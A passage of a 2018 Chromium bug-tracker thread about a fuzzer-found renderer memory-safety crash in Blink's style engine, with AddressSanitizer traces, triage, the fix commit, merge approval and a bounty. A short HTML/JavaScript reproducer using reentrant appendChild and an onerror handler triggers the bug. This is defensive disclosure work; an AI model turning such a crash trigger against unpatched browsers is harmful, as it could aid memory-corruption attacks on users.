    #13 0x558738a67f8e in blink::V8GCController::GcEpilogue(v8::Isolate*, v8::GCType, v8::GCCallbackFlags) ./../../third_party/blink/renderer/bindings/core/v8/v8_gc_controller.cc:257:29
    #14 0x55872a90e177 in CallGCEpilogueCallbacks ./../../v8/src/heap/heap.cc:1841:7
    #15 0x55872a90e177 in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1810:0
    #16 0x55872a906a8d in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1395:11
    #17 0x55872a9026ea in v8::internal::Heap::CollectAllGarbage(int, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) ./../../v8/src/heap/heap.cc:1156:3
    #18 0x558729e41a92 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*) ./../../v8/src/api-arguments-inl.h:94:3
    #19 0x558729e3ebf9 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) ./../../v8/src/builtins/builtins-api.cc:109:36
    #20 0x558729e3c3cc in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) ./../../v8/src/builtins/builtins-api.cc:139:5
#16 0x7ee5e7e5777d <unknown>


### cl...@gmail.com (2018-06-04)

While minimising the testcase I also saw this use-after-poison a few times:

==24740==ERROR: AddressSanitizer: use-after-poison on address 0x7ecc081c4258 at pc 0x560de011854c bp 0x7ffd7f924e10 sp 0x7ffd7f924e08
WRITE of size 1 at 0x7ecc081c4258 thread T0 (chrome)
    #0 0x560de011854b in MarkSheetListDirty third_party/blink/renderer/core/css/style_sheet_collection.h:67:49
    #1 0x560de011854b in blink::StyleEngine::MarkTreeScopeDirty(blink::TreeScope&) third_party/blink/renderer/core/css/style_engine.cc:633
    #2 0x560de0117eac in SetNeedsActiveStyleUpdate third_party/blink/renderer/core/css/style_engine.cc:237:5
    #3 0x560de0117eac in blink::StyleEngine::RemovePendingSheet(blink::Node&, blink::StyleEngineContext const&) third_party/blink/renderer/core/css/style_engine.cc:212
    #4 0x560de27e62cb in blink::StyleElement::SheetLoaded(blink::Document&) third_party/blink/renderer/core/css/style_element.cc:193:29
    #5 0x560de015d867 in blink::CSSStyleSheet::SheetLoaded() third_party/blink/renderer/core/css/css_style_sheet.cc:500:33
    #6 0x560de021b081 in blink::StyleSheetContents::CheckLoaded() third_party/blink/renderer/core/css/style_sheet_contents.cc:441:31
    #7 0x560de27e5e74 in blink::StyleElement::CreateSheet(blink::Element&, WTF::String const&) third_party/blink/renderer/core/css/style_element.cc:177:25
    #8 0x560de27e501c in Process third_party/blink/renderer/core/css/style_element.cc:110:10
    #9 0x560de27e501c in blink::StyleElement::ChildrenChanged(blink::Element&) third_party/blink/renderer/core/css/style_element.cc:97
    #10 0x560de27e34ff in blink::HTMLStyleElement::ChildrenChanged(blink::ContainerNode::ChildrenChange const&) third_party/blink/renderer/core/html/html_style_element.cc:97:21
    #11 0x560de08cccdd in blink::ContainerNode::DidInsertNodeVector(blink::HeapVector<blink::Member<blink::Node>, 11ul> const&, blink::Node*, blink::HeapVector<blink::Member<blink::Node>, 11ul> const&) third_party/blink/renderer/core/dom/container_node.cc:335:5
    #12 0x560de08ce54e in blink::ContainerNode::AppendChild(blink::Node*, blink::ExceptionState&) third_party/blink/renderer/core/dom/container_node.cc:849:3
    #13 0x560de188027e in blink::Node::appendChild(blink::Node*, blink::ExceptionState&) third_party/blink/renderer/core/dom/node.cc:479:35
    #14 0x560de0927d4c in appendChildMethodForMainWorld gen/third_party/blink/renderer/bindings/core/v8/v8_node.cc:588:24
    #15 0x560de0927d4c in blink::V8Node::appendChildMethodCallbackForMainWorld(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_node.cc:935
    #16 0x560dd2b91a91 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*) v8/src/api-arguments-inl.h:94:3
    #17 0x560dd2b8ebf8 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36
    #18 0x560dd2b8c3cb in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:139:5
    #19 0x7edd8265777c  (<unknown module>)
    #20 0x7edd8260e644  (<unknown module>)
    #21 0x7edd8260e644  (<unknown module>)
    #22 0x7edd82607685  (<unknown module>)
    #23 0x7edd8260bc88  (<unknown module>)
    #24 0x7edd82606960  (<unknown module>)
    #25 0x560dd3559eff in Call v8/src/simulator.h:113:12
    #26 0x560dd3559eff in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:155
    #27 0x560dd35592b2 in CallInternal v8/src/execution.cc:191:10
    #28 0x560dd35592b2 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:202
    #29 0x560dd2a2078f in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api.cc:5210:7
    #30 0x560ddffbcbc1 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:598:17
    #31 0x560de000b291 in blink::V8EventListener::CallListenerFunction(blink::ScriptState*, v8::Local<v8::Value>, blink::Event*) third_party/blink/renderer/bindings/core/v8/v8_event_listener.cc:115:8
    #32 0x560de000cc5f in blink::V8AbstractEventListener::InvokeEventHandler(blink::ScriptState*, blink::Event*, v8::Local<v8::Value>) third_party/blink/renderer/bindings/core/v8/v8_abstract_event_listener.cc:155:20
    #33 0x560de000c4db in blink::V8AbstractEventListener::HandleEvent(blink::ScriptState*, blink::Event*) third_party/blink/renderer/bindings/core/v8/v8_abstract_event_listener.cc:104:3
    #34 0x560de000c04b in blink::V8AbstractEventListener::handleEvent(blink::ExecutionContext*, blink::Event*) third_party/blink/renderer/bindings/core/v8/v8_abstract_event_listener.cc:92:3
    #35 0x560de181019d in blink::EventTarget::FireEventListeners(blink::Event*, blink::EventTargetData*, blink::HeapVector<blink::RegisteredEventListener, 1ul>&) third_party/blink/renderer/core/dom/events/event_target.cc:805:15
    #36 0x560de180dbd4 in blink::EventTarget::FireEventListeners(blink::Event*) third_party/blink/renderer/core/dom/events/event_target.cc:656:29
    #37 0x560de180d791 in blink::EventTarget::DispatchEventInternal(blink::Event*) third_party/blink/renderer/core/dom/events/event_target.cc:560:41
    #38 0x560de1d37e86 in blink::ExecutionContext::DispatchErrorEventInternal(blink::ErrorEvent*, blink::AccessControlStatus) third_party/blink/renderer/core/execution_context/execution_context.cc:155:11
    #39 0x560de1d374a4 in blink::ExecutionContext::DispatchErrorEvent(blink::ErrorEvent*, blink::AccessControlStatus) third_party/blink/renderer/core/execution_context/execution_context.cc:133:8
    #40 0x560ddffc1875 in blink::V8Initializer::MessageHandlerInMainThread(v8::Local<v8::Message>, v8::Local<v8::Value>) third_party/blink/renderer/bindings/core/v8/v8_initializer.cc:239:12
    #41 0x560dd39e68c4 in v8::internal::MessageHandler::ReportMessageNoExceptions(v8::internal::Isolate*, v8::internal::MessageLocation const*, v8::internal::Handle<v8::internal::Object>, v8::Local<v8::Value>) v8/src/messages.cc:164:9
    #42 0x560dd39e605e in v8::internal::MessageHandler::ReportMessage(v8::internal::Isolate*, v8::internal::MessageLocation const*, v8::internal::Handle<v8::internal::JSMessageObject>) v8/src/messages.cc:127:5
    #43 0x560dd39173eb in v8::internal::Isolate::ReportPendingMessagesImpl(bool) v8/src/isolate.cc:1895:5
    #44 0x560dd355a0b9 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:169:16
    #45 0x560dd35592b2 in CallInternal v8/src/execution.cc:191:10
    #46 0x560dd35592b2 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:202
    #47 0x560dd29d67ec in v8::Script::Run(v8::Local<v8::Context>) v8/src/api.cc:2184:7
    #48 0x560ddffb82a7 in blink::V8ScriptRunner::RunCompiledScript(v8::Isolate*, v8::Local<v8::Script>, blink::ExecutionContext*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:425:22
    #49 0x560de0fc7dc7 in blink::ScriptController::ExecuteScriptAndReturnValue(v8::Local<v8::Context>, blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) third_party/blink/renderer/bindings/core/v8/script_controller.cc:148:20
    #50 0x560de0fca536 in blink::ScriptController::EvaluateScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus, blink::ScriptController::ExecuteScriptPolicy) third_party/blink/renderer/bindings/core/v8/script_controller.cc:349:33
    #51 0x560de0fcaf1f in blink::ScriptController::ExecuteScriptInMainWorld(blink::ScriptSourceCode const&, blink::KURL const&, blink::ScriptFetchOptions const&, blink::AccessControlStatus) third_party/blink/renderer/bindings/core/v8/script_controller.cc:314:3
    #52 0x560de3afe104 in blink::PendingScript::ExecuteScriptBlockInternal(blink::Script*, bool, blink::ScriptElementBase*, bool, bool, bool, base::TimeTicks, bool) third_party/blink/renderer/core/script/pending_script.cc:261:13
    #53 0x560de3afd9ec in blink::PendingScript::ExecuteScriptBlock(blink::KURL const&) third_party/blink/renderer/core/script/pending_script.cc:171:3
    #54 0x560de3b028d0 in blink::ScriptLoader::PrepareScript(WTF::TextPosition const&, blink::ScriptLoader::LegacyTypeSupport) third_party/blink/renderer/core/script/script_loader.cc:682:9
    #55 0x560de3b03e38 in blink::ScriptLoader::ChildrenChanged() third_party/blink/renderer/core/script/script_loader.cc:111:5
    #56 0x560de08cccdd in blink::ContainerNode::DidInsertNodeVector(blink::HeapVector<blink::Member<blink::Node>, 11ul> const&, blink::Node*, blink::HeapVector<blink::Member<blink::Node>, 11ul> const&) third_party/blink/renderer/core/dom/container_node.cc:335:5
    #57 0x560de08ce54e in blink::ContainerNode::AppendChild(blink::Node*, blink::ExceptionState&) third_party/blink/renderer/core/dom/container_node.cc:849:3
    #58 0x560de188027e in blink::Node::appendChild(blink::Node*, blink::ExceptionState&) third_party/blink/renderer/core/dom/node.cc:479:35
    #59 0x560de0b58aa3 in append third_party/blink/renderer/core/dom/parent_node.h:72:17
    #60 0x560de0b58aa3 in appendMethod gen/third_party/blink/renderer/bindings/core/v8/v8_element.cc:3097
    #61 0x560de0b58aa3 in blink::V8Element::appendMethodCallback(v8::FunctionCallbackInfo<v8::Value> const&) gen/third_party/blink/renderer/bindings/core/v8/v8_element.cc:4740
    #62 0x560dd2b91a91 in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo*) v8/src/api-arguments-inl.h:94:3
    #63 0x560dd2b8ebf8 in v8::internal::MaybeHandle<v8::internal::Object> v8::internal::(anonymous namespace)::HandleApiCallHelper<false>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::HeapObject>, v8::internal::Handle<v8::internal::FunctionTemplateInfo>, v8::internal::Handle<v8::internal::Object>, v8::internal::BuiltinArguments) v8/src/builtins/builtins-api.cc:109:36
    #64 0x560dd2b8c3cb in v8::internal::Builtin_Impl_HandleApiCall(v8::internal::BuiltinArguments, v8::internal::Isolate*) v8/src/builtins/builtins-api.cc:139:5
    #65 0x7edd8265777c  (<unknown module>)
    #66 0x7edd8260e644  (<unknown module>)
    #67 0x7edd8260e644  (<unknown module>)
    #68 0x7edd8260e644  (<unknown module>)
    #69 0x7edd8260bc88  (<unknown module>)
    #70 0x7edd82606960  (<unknown module>)
    #71 0x560dd3559eff in Call v8/src/simulator.h:113:12
    #72 0x560dd3559eff in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, bool, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*, v8::internal::Handle<v8::internal::Object>, v8::internal::Execution::MessageHandling, v8::internal::Execution::Target) v8/src/execution.cc:155
    #73 0x560dd35592b2 in CallInternal v8/src/execution.cc:191:10
    #74 0x560dd35592b2 in v8::internal::Execution::Call(v8::internal::Isolate*, v8::internal::Handle<v8::internal::Object>, v8::internal::Handle<v8::internal::Object>, int, v8::internal::Handle<v8::internal::Object>*) v8/src/execution.cc:202
    #75 0x560dd2a2078f in v8::Function::Call(v8::Local<v8::Context>, v8::Local<v8::Value>, int, v8::Local<v8::Value>*) v8/src/api.cc:5210:7
    #76 0x560ddffbcbc1 in blink::V8ScriptRunner::CallFunction(v8::Local<v8::Function>, blink::ExecutionContext*, v8::Local<v8::Value>, int, v8::Local<v8::Value>*, v8::Isolate*) third_party/blink/renderer/bindings/core/v8/v8_script_runner.cc:598:17
    #77 0x560de1f9d21a in blink::ScheduledAction::Execute(blink::LocalFrame*) third_party/blink/renderer/bindings/core/v8/scheduled_action.cc:159:5
    #78 0x560de1f9c987 in blink::ScheduledAction::Execute(blink::ExecutionContext*) third_party/blink/renderer/bindings/core/v8/scheduled_action.cc:115:5
    #79 0x560de1f99ae7 in blink::DOMTimer::Fired() third_party/blink/renderer/core/frame/dom_timer.cc:176:11
    #80 0x560ddfeeade5 in blink::TimerBase::RunInternal() third_party/blink/renderer/platform/timer.cc:161:3
    #81 0x560dd5c4c789 in Run base/callback.h:96:12
    #82 0x560dd5c4c789 in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*) base/debug/task_annotator.cc:101
    #83 0x560dd48e738a in base::sequence_manager::internal::ThreadControllerImpl::DoWork(base::sequence_manager::internal::ThreadControllerImpl::WorkType) third_party/blink/renderer/platform/scheduler/base/thread_controller_impl.cc:166:21
    #84 0x560dd5c4c789 in Run base/callback.h:96:12
    #85 0x560dd5c4c789 in base::debug::TaskAnnotator::RunTask(char const*, base::PendingTask*) base/debug/task_annotator.cc:101
    #86 0x560dd5cbbfe9 in base::MessageLoop::RunTask(base::PendingTask*) base/message_loop/message_loop.cc:319:25
    #87 0x560dd5cbdb69 in DeferOrRunPendingTask base/message_loop/message_loop.cc:329:5
    #88 0x560dd5cbdb69 in base::MessageLoop::DoDelayedWork(base::TimeTicks*) base/message_loop/message_loop.cc:413
    #89 0x560dd5cc7203 in base::MessagePumpDefault::Run(base::MessagePump::Delegate*) base/message_loop/message_pump_default.cc:41:27
    #90 0x560dd5d4c05b in base::RunLoop::Run() base/run_loop.cc:102:14
    #91 0x560de70d4061 in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer_main.cc:218:23
    #92 0x560dd5048b51 in content::RunZygote(content::ContentMainDelegate*) content/app/content_main_runner_impl.cc:567:14
    #93 0x560dd504d1d2 in content::ContentMainRunnerImpl::Run() content/app/content_main_runner_impl.cc:969:10
    #94 0x560dd507161c in service_manager::Main(service_manager::MainParams const&) services/service_manager/embedder/main.cc:459:29
    #95 0x560dd5046b87 in content::ContentMain(content::ContentMainParams const&) content/app/content_main.cc:19:10
    #96 0x560dcd54c043 in ChromeMain chrome/app/chrome_main.cc:101:12
    #97 0x7fbb6cdaab96 in __libc_start_main /build/glibc-OTsEL5/glibc-2.27/csu/../csu/libc-start.c:310

Address 0x7ecc081c4258 is a wild pointer.
SUMMARY: AddressSanitizer: use-after-poison third_party/blink/renderer/core/css/style_sheet_collection.h:67:49 in MarkSheetListDirty
Shadow bytes around the buggy address:
  0x0fda010307f0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fda01030800: f7 00 00 00 f7 00 00 f7 00 00 00 f7 00 00 00 f7
  0x0fda01030810: 00 00 00 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 00
  0x0fda01030820: 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 f7 00
  0x0fda01030830: 00 f7 00 00 f7 00 00 f7 00 00 f7 00 00 00 f7 00
=>0x0fda01030840: 00 f7 00 00 00 f7 00 00 00 f7 f7[f7]f7 f7 f7 f7
  0x0fda01030850: 00 f7 00 00 00 f7 00 00 00 f7 00 00 f7 00 00 00
  0x0fda01030860: f7 00 00 00 f7 00 00 f7 00 00 00 f7 00 00 00 f7
  0x0fda01030870: 00 00 f7 00 00 00 f7 00 00 00 f7 00 00 f7 00 00
  0x0fda01030880: 00 f7 00 00 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
  0x0fda01030890: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==24740==ABORTING

### wf...@chromium.org (2018-06-14)

hiroshige, any progress triaging this bug?

### hi...@chromium.org (2018-06-14)

No so much. It seems the crash occurs since before clusterfuzz regression range?

As for crashes in Comments #2 (clusterfuzz) and #11,
DCHECK(collection) in StyleEngine::MarkTreeScopeDirty() seems to fail, so this aspect looks like core/css issue.
andruud@, could you take a look and triage this issue?

As for crashes in Comments #0 #10, they occur inside GC (with different stack traces) and I suspect hitting Oilpan-related issue. haraken@, could you triage this aspect?
(Still I couldn't reproduce this aspect_though)

### an...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### an...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### wf...@chromium.org (2018-06-15)

[Empty comment from Monorail migration]

### an...@chromium.org (2018-06-18)

See reduced repro case below (for DCHECK(collection)).. The problem seems to be that we are entering ::AppendChild while we are already on the call stack of ::AppendChild.

<script>
function start() {
  style = document.createElement('style');
  document.body.appendChild(style);

  let sr = shadowHost.createShadowRoot();
  let script = document.createElement('script');
  sr.appendChild(script);

  script.append('fail', style);
}

window.onerror = function() {
  style.appendChild(document.createTextNode(''));
}

</script>
<div id="shadowHost">
</div>
<body onload="start()"></body>

### an...@chromium.org (2018-06-18)

Summary: There are two issues here:

1) Use-after-free related to ScriptState.
2) TreeScopeStyleSheetCollection is null in StyleEngine::MarkTreeScopeDirty.

This comment applies to (2). I have not analyzed (1).

When calling 'script.append('fail', style)', we seem to be evaluating 'fail' as a script synchronously before HTMLStyleElement::DidNotifySubtreeInsertionsToDocument happens. The onerror then modifies the HTMLStyleElement, which is in a weird state, because the previous ContainerNode::AppendChild has still not completed.

DOM experts: Should we really be evaluating a synchronous script before ::DidNotifySubtreeInsertionsToDocument?


[Monorail components: -Blink>CSS Blink>DOM]

### fu...@chromium.org (2018-06-18)

[Empty comment from Monorail migration]

### ha...@chromium.org (2018-06-18)

Could you avoid to use Blink>DOM unless the issue is directly related to DOM Standard (https://dom.spec.whatwg.org/) implementation?

> DOM experts: Should we really be evaluating a synchronous script before ::DidNotifySubtreeInsertionsToDocument?

I am not 100% sure, however, I am not surprised if it can happen for such a synchronous mutation event.

https://html.spec.whatwg.org/#the-script-element should define the semantics.



[Monorail components: -Blink>DOM Blink>HTML>Script]

### an...@chromium.org (2018-06-18)

I split out the CSS bug: https://crbug.com/chromium/853709.

### an...@chromium.org (2018-06-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2018-06-19)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/2bf635c28effa427a270f4fc45df84ed344f411c

commit 2bf635c28effa427a270f4fc45df84ed344f411c
Author: Anders Hartvoll Ruud <andruud@chromium.org>
Date: Tue Jun 19 07:47:58 2018

Do not crash while reentrantly appending to style element.

When a node is inserted into a container, it is notified via
::InsertedInto. However, a node may request a second notification via
DidNotifySubtreeInsertionsToDocument, which occurs after all the children
have been notified as well. *StyleElement is currently using this
second notification.

This causes a problem, because *ScriptElement is using the same mechanism,
which in turn means that scripts can execute before the state of
*StyleElements are properly updated.

This patch avoids ::DidNotifySubtreeInsertionsToDocument, and instead
processes the stylesheet in ::InsertedInto. The original reason for using
::DidNotifySubtreeInsertionsToDocument in the first place appears to be
invalid now, as the test case is still passing.

R=futhark@chromium.org, hayato@chromium.org

Bug: 853709, 847570
Cq-Include-Trybots: luci.chromium.try:linux_layout_tests_slimming_paint_v2;master.tryserver.blink:linux_trusty_blink_rel
Change-Id: Ic0b5fa611044c78c5745cf26870a747f88920a14
Reviewed-on: https://chromium-review.googlesource.com/1104347
Commit-Queue: Anders Ruud <andruud@chromium.org>
Reviewed-by: Rune Lillesveen <futhark@chromium.org>
Cr-Commit-Position: refs/heads/master@{#568368}
[add] https://crrev.com/2bf635c28effa427a270f4fc45df84ed344f411c/third_party/WebKit/LayoutTests/fast/dom/shadow/style-change-tree-scope.html
[modify] https://crrev.com/2bf635c28effa427a270f4fc45df84ed344f411c/third_party/blink/renderer/core/html/html_style_element.cc
[modify] https://crrev.com/2bf635c28effa427a270f4fc45df84ed344f411c/third_party/blink/renderer/core/html/html_style_element.h
[modify] https://crrev.com/2bf635c28effa427a270f4fc45df84ed344f411c/third_party/blink/renderer/core/svg/svg_style_element.cc
[modify] https://crrev.com/2bf635c28effa427a270f4fc45df84ed344f411c/third_party/blink/renderer/core/svg/svg_style_element.h


### va...@chromium.org (2018-06-19)

Security Sheriff drive by comment: Can this issue be marked as fixed now that the patch has landed? Thanks.

### cl...@chromium.org (2018-06-20)

ClusterFuzz has detected this issue as fixed in range 568367:568368.

Detailed report: https://clusterfuzz.com/testcase?key=6010833512169472

Job Type: linux_asan_content_shell
Platform Id: linux

Crash Type: Null-dereference WRITE
Crash Address: 0x000000000028
Crash State:
  blink::StyleEngine::MarkTreeScopeDirty
  blink::StyleEngine::RemovePendingSheet
  blink::StyleElement::SheetLoaded
  
Sanitizer: address (ASAN)

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell&range=523933:523937
Fixed: https://clusterfuzz.com/revisions?job=linux_asan_content_shell&range=568367:568368

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6010833512169472

See https://github.com/google/clusterfuzz-tools for more information.

If you suspect that the result above is incorrect, try re-doing that job on the test case report page.

### cl...@chromium.org (2018-06-20)

ClusterFuzz testcase 6010833512169472 is verified as fixed, so closing issue as verified.

If this is incorrect, please add ClusterFuzz-Wrong label and re-open the issue.

### sh...@chromium.org (2018-06-20)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-22)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-06-22)

This bug requires manual review: M68 has already been promoted to the beta branch, so this requires manual review
Please contact the milestone owner if you have questions.
Owners: cmasso@(Android), kariahda@(iOS), bhthompson@(ChromeOS), abdulsyed@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2018-06-25)

How safe is this merge? Is this absolutely needed for 68 or can it wait until 69?

### aw...@google.com (2018-06-26)

I'll let andruud@ comment on the risk, though looks reasonable. But from a security point of view, yes, we should take this in 68.

### ab...@google.com (2018-06-26)

Approving merge for M68. Branch:3440

### aw...@chromium.org (2018-06-26)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-06-29)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
*********************************

### aw...@chromium.org (2018-06-29)

$3,000 for this one, thanks!

### aw...@chromium.org (2018-06-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-02)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2018-07-06)

This issue has been approved for a merge. Please merge the fix to any appropriate branches as soon as possible!

If all merges have been completed, please remove any remaining Merge-Approved labels from this issue.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### hi...@chromium.org (2018-07-17)

Hi cloudfuzzer@, could you check whether the CL (https://crbug.com/chromium/847570#c23) fixes the crash you reported, i.e. the crash is fixed on canary/dev on or after 69.0.3466.0?

Because clusterfuzz and I could only reproduce the crash that was split as https://crbug.com/chromium/853709, I'd like to verify whether the CL also fix the original crash you reported as well.

### ab...@google.com (2018-07-17)

[Empty comment from Monorail migration]

### cl...@gmail.com (2018-07-20)

Hi, just tested against a recent ASAN build (asan-linux-release-575422) and can confirm that it does not reproduce for me anymore.

### hi...@chromium.org (2018-07-20)

Thanks for verifying! Keeping this issue closed as Verified.

### aw...@google.com (2018-07-23)

[Empty comment from Monorail migration]

### aw...@google.com (2018-08-16)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-09-04)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-09-26)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### aw...@chromium.org (2019-01-04)

[Empty comment from Monorail migration]

### is...@google.com (2019-01-04)

This issue was migrated from crbug.com/chromium/847570?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40091503)*
